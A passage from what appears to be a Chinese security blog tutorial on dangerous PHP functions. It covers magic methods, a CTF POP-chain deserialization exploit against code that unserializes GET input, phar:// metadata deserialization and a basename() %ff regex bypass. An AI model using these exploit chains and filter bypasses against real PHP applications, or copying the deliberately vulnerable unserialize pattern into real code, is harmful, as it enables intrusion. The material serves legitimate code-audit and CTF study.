class="title">__construct</span><span class="params">($name=<span class="string">""</span>)</span></span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span><span class="params">($content)</span></span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"当在类外面调用isset方法时，那么我就会执行！"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;$content);</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br><span class="line">	$ameng = <span class="keyword">new</span> Ameng(<span class="string">"Ameng"</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="keyword">isset</span>($ameng-&gt;name);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//当在类外面调用isset方法时，那么我就会执行！</span></span><br><span class="line"><span class="comment">//1</span></span><br></pre></td></tr></table></figure>

<h4 id="unset"><a href="#unset" class="headerlink" title="__unset()"></a>__unset()</h4><p>这个方法基本和<code>__insset</code>情况一致，都是在类外访问类内私有成员时要调用这个函数，基本调用的方法和上面一致。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	header(<span class="string">"Content-Type: text/html; charset=utf-8"</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Ameng</span></span>&#123;  </span><br><span class="line">		<span class="keyword">private</span> $name;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name=<span class="string">""</span>)</span></span>&#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span><span class="params">($content)</span></span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"当在类外面调用unset方法时，那么我就会执行！"</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">			<span class="keyword">echo</span> <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;$content);</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br><span class="line">	$ameng = <span class="keyword">new</span> Ameng(<span class="string">"Ameng"</span>);</span><br><span class="line">	<span class="keyword">unset</span>($ameng-&gt;name);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//当在类外面调用unset方法时，那么我就会执行！</span></span><br><span class="line"><span class="comment">//1</span></span><br></pre></td></tr></table></figure>

<h4 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="toString()"></a>toString()</h4><p>此函数是将一个对象当作一个字符串来使用时，就会自动调用该方法，且在该方法中，可以返回一定的字符串，来表示该对象转换为字符串之后的结果。</p>
<p>通常情况下，我们访问类的属性的时候都是<code>$实例化名称-&gt;属性名</code>这样的格式去访问，但是我们不能直接echo去输出对象，可是当我们使用<code>__tostring()</code>就可以直接用echo来输出了。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    header(<span class="string">"Content-Type: text/html; charset=utf-8"</span>);</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Ameng</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $name;</span><br><span class="line">        <span class="keyword">private</span> $age;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name,$age)</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;name . <span class="keyword">$this</span>-&gt;age . <span class="string">'岁了'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	$ameng = <span class="keyword">new</span> Ameng(<span class="string">'Ameng'</span>,<span class="number">3</span>);</span><br><span class="line">	<span class="keyword">echo</span> $ameng;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>执行结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ameng3岁了</span><br></pre></td></tr></table></figure>

<h4 id="invoke"><a href="#invoke" class="headerlink" title="__invoke()"></a>__invoke()</h4><p>当尝试以调用函数的方式调用一个对象时，<code>__invoke()</code>方法会被自动调用。</p>
<p>版本要求：</p>
<p>PHP &gt; 5.3.0</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    header(<span class="string">"Content-Type: text/html; charset=utf-8"</span>);</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">Ameng</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $name;</span><br><span class="line">        <span class="keyword">private</span> $age;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name,$age)</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">'你用调用函数的方式调用了这个对象，所以我起作用了'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	$ameng = <span class="keyword">new</span> Ameng(<span class="string">'Ameng'</span>,<span class="number">3</span>);</span><br><span class="line">	$ameng();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">执行结果——&gt;</span><br><span class="line">你用调用函数的方式调用了这个对象，所以我起作用</span><br></pre></td></tr></table></figure>

<h3 id="pop链的构造"><a href="#pop链的构造" class="headerlink" title="pop链的构造"></a>pop链的构造</h3><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>寻找位点（unserialize函数—&gt;变量可控）</li>
<li>正向构造（各种方法）</li>
<li>反向推理（从要完成的目的出发，反向推理，最后找到最先被调用的位置处）</li>
</ol>
<p>来看一个简单的例子(HECTF)：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $var;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> $token_flag;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">         <span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">         <span class="keyword">$this</span>-&gt;token =&amp;<span class="keyword">$this</span>-&gt;token_flag;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"flag&#123;**********&#125;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;source.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str[<span class="string">'str'</span>]-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/http|https|file:|gopher|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker~"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $params;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $func = <span class="keyword">$this</span>-&gt;params;</span><br><span class="line">        <span class="keyword">return</span> $func();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'chal'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $chal = unserialize($_GET[<span class="string">'chal'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们要拿到flag，在<code>__invoke()</code>函数，当对象被当作函数调用时，那么就会自动执行该函数。所以我们要做的就是用函数来调用对象。</p>
<p>那么我们首先找到起点，就是unserialize函数的变量，因为这个变量是我们可控的，但是肯定是过滤了一些常见的协议，那些协议我在上面也简单介绍过用法。</p>
<p>通过函数的过程搜索，我们能够看到preg_match第二个参数会被当作字符串处理，在类Test中，我们可以给$func赋值给Read对象。</p>
<p>那么我们可以构造如下pop链</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    ··········</span><br><span class="line">    $read = <span class="keyword">new</span> Read();</span><br><span class="line">    $show = <span class="keyword">new</span> Show();</span><br><span class="line">    $test = <span class="keyword">new</span> Test();</span><br><span class="line">	</span><br><span class="line">	$read-&gt;token = &amp;$read-&gt;token_flag;</span><br><span class="line">    $test-&gt;params = $read;</span><br><span class="line">    $show-&gt;str[<span class="string">'str'</span>] = $test;</span><br><span class="line">    $show-&gt;source = $show;</span><br><span class="line">    <span class="keyword">echo</span> serialize($show);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>给个图总结一下：</p>
<p><img src="https://image.3001.net/images/20210425/16193177609106.png" alt="image-20210424041917873"></p>
<h3 id="phar与反序列化"><a href="#phar与反序列化" class="headerlink" title="phar与反序列化"></a>phar与反序列化</h3><p>简介 </p>
<p>PHAR（”PHP archive”）是PHP里类似JAR的一种打包文件，在PHP &gt; 5.3版本中默认开启。其实就是用来打包程序的。</p>
<p>文件结构 </p>
<ol>
<li><p>a stub：<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>前面内容不限，后面必须以<code>__HALT_COMPILER();?&gt;</code>结尾，否则phar扩展无法将该文件识别为phar文件。</p>
</li>
<li><p>官方手册</p>
<p>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p>
</li>
</ol>
<h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>前提：将<code>php.ini</code>中的<code>phar.readonly</code>选项设置为<code>off</code>，不然无法生成phar文件。</p>
<p>phar.php： </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $o -&gt; data=<span class="string">'Hello I am Ameng'</span>;</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在我们访问之后，会在当前目录下生成一个phar.phar文件。</p>
<p>然后查看文件的十六进制形式，我们就可以看到meta-data是以序列化的形式存储。既然存在序列化的数据，那肯定有序列化的逆向操作反序列化。那么这里在PHP中存在很多通过<code>phar://</code>伪协议解析phar文件时，会将meta-data进行反序列化。可用函数如下图</p>
<p><img src="https://image.3001.net/images/20210425/16193177636677.png" alt="image-20210424042041064"></p>
<p>Ameng.php </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestObject</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span> -&gt; data;   <span class="comment">// <span class="doctag">TODO:</span> Implement __destruct() method.</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">'phar://phar.phar'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//Hello I am Ameng</span></span><br></pre></td></tr></table></figure>

<h3 id="其他一些总结"><a href="#其他一些总结" class="headerlink" title="其他一些总结"></a>其他一些总结</h3><h4 id="basename"><a href="#basename" class="headerlink" title="basename()"></a>basename()</h4><p>此函数返回路径中的文件名的一部分(后面)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">basename(path,suffix)</span><br></pre></td></tr></table></figure>

<p>参数 </p>
<ul>
<li>path：必需。规定要检查的路径。</li>
<li>suffix：可选。规定文件的扩展名。</li>
</ul>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $path = <span class="string">"index.php/test.php"</span>;</span><br><span class="line">	<span class="keyword">echo</span> basename($path);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">        </span><br><span class="line">执行结果——&gt;</span><br><span class="line">test.php</span><br></pre></td></tr></table></figure>

<p>此函数还有一个特点，就是会去掉文件名的非ASCII码值。</p>
<p>代码示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$path = $_GET[<span class="string">'x'</span>];</span><br><span class="line">	print_r(basename($path));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//通过 url 传入参数`x=index.php/config.php/%ff`</span></span><br><span class="line"><span class="comment">//结果：回显config.php</span></span><br></pre></td></tr></table></figure>

<p>可以看到，<code>%ff</code>直接没了，而是直接输出前面的的文件名，这个可以用来绕过一些正则匹配。原因就在于<code>%ff</code>在通过 url 传参时会被 url 解码，解码成了不可见字符，满足了<code>basename</code>函数对文件名的非ASCII值去除的特点，从而被删掉。</p>
<p>参考链接：<a href="https://wiki.wgpsec.org/knowledge/code-audit/php-code-audit.html（狼组知识库）" target="_blank" rel="noopener">https://wiki.wgpsec.org/knowledge/code-audit/php-code-audit.html（狼组知识库）</a></p>

      
    </div>
    
    
    

    

    

    
      <div>
        <ul class="post-copyright">
  <li class="post-copyright-author">
    <strong>本文作者：</strong>
    joker0xxx3
  </li>
  <li class="post-copyright-link">
    <strong>本文链接：</strong>
    <a href="http://joker-vip.github.io/2021/04/25/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0/" title="PHP代码审计危险函数">http://joker-vip.github.io/2021/04/25/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0/</a>
  </li>
  <li class="post-copyright-license">
    <strong>版权声明： </strong>
    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
  </li>
</ul>

      </div>
    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/PHP/" rel="tag"><i class="fa fa-tag"></i> PHP</a>
          
            <a href="/tags/%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0/" rel="tag"><i class="fa fa-tag"></i> 危险函数</a>
          
            <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"><i class="fa fa-tag"></i> 代码审计</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2021/04/24/nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E9%92%93%E9%B1%BC/" rel="next" title="nginx反向代理钓鱼">
                <i class="fa fa-chevron-left"></i> nginx反向代理钓鱼
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2021/04/25/%E4%BA%91%E5%87%BD%E6%95%B0%E4%BB%A3%E7%90%86%E6%B1%A0/" rel="prev" title="云函数代理池">
                云函数代理池 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/header.jpg"
                alt="joker0xxx3" />
            
              <p class="site-author-name" itemprop="name">joker0xxx3</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
                <a href="/archives">
                  <span class="site-state-item-count">131</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">14</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">76</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/joker-vip" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:1186948300@qq.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://www.cnblogs.com/joker-vip/" target="_blank" title="博客园">
                      
                        <i class="fa fa-fw fa-refresh"></i>博客园</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://space.bilibili.com/247897008" target="_blank" title="BiliBili">
                      
                        <i class="fa fa-fw fa-fa-plane"></i>BiliBili</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                友情链接
              </div>
                
                  <span class="links-of-blogroll-item">
                    <a href="https://scholar10.github.io/" title="Sch0lar" target="_blank">Sch0lar</a>
                  </span>
                
                  <span class="links-of-blogroll-item">
                    <a href="https://www.cnblogs.com/sakura521/" title="sakura" target="_blank">sakura</a>
                  </span>
                
                  <span class="links-of-blogroll-item">
                    <a href="https://www.haoyun.fit/" title="小透的少年江湖" target="_blank">小透的少年江湖</a>
                  </span>
                
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP代码审计危险函数"><span class="nav-text">PHP代码审计危险函数</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#代码执行"><span class="nav-text">代码执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#eval"><span class="nav-text">eval()</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#assert"><span class="nav-text">assert()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#preg-replace"><span class="nav-text">preg_replace()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#create-function"><span class="nav-text">create_function()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#array-map"><span class="nav-text">array_map()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#call-user-func"><span class="nav-text">call_user_func()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#call-user-func-array"><span class="nav-text">call_user_func_array()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#array-filter"><span class="nav-text">array_filter()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#usort"><span class="nav-text">usort()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#uasort"><span class="nav-text">uasort()</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#命令执行"><span class="nav-text">命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#system"><span class="nav-text">system()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exec"><span class="nav-text">exec()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#shell-exec"><span class="nav-text">shell_exec()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#passthru"><span class="nav-text">passthru()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pcntl-exec"><span class="nav-text">pcntl_exec()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#popen"><span class="nav-text">popen()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#proc-open"><span class="nav-text">proc_open()</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件包含"><span class="nav-text">文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#include-once"><span class="nav-text">include_once()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#require"><span class="nav-text">require()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#require-once"><span class="nav-text">require_once()</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件读取-下载"><span class="nav-text">文件读取(下载)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#file-get-contents"><span class="nav-text">file_get_contents()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fopen"><span class="nav-text">fopen()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fread"><span class="nav-text">fread()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fgets"><span class="nav-text">fgets()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fgetss"><span class="nav-text">fgetss()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#readfile"><span class="nav-text">readfile()</span></a></li><li class="nav-item 